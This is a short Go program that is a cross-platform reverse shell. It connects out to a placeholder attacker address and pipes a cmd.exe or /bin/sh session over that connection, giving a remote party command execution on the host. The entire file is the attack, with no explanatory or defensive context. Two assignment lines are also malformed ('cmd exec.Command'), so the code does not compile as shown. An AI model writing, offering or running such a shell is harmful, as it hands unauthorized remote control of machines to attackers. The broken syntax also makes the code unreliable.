package main

import (

"net"

"os/exec"

"runtime"

)

func main() {

conn, _ := net.Dial("tcp", "attacker_ip: attacker_port")

var cmd *exec.Cmd

if runtime.GOOS == "windows" {

cmd exec.Command("cmd.exe")

} else {

cmd exec.Command("/bin/sh")

}

cmd.Stdin = conn

cmd.Stdout = conn

cmd.Stderr = conn

cmd.Run()

}